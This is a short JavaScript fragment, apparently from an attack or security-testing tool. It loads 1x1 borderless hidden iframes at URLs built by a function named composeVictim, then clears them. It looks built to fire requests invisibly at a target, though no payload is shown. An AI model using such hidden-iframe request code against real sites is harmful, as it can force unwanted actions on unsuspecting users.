const Frames = {
	async draw(target) {
		$("<iframe>", {
			src: await composeVictim(target),
			method: 'get',
			frameBorder: 0,
			width: 1,
			height: 1
		}).appendTo(frameDiv)
	},
	clear() {
		const a = frameDiv[0].children;
		while (frameDiv[0].children.length) {
			for (let i of a) i.remove();
		}
	}
}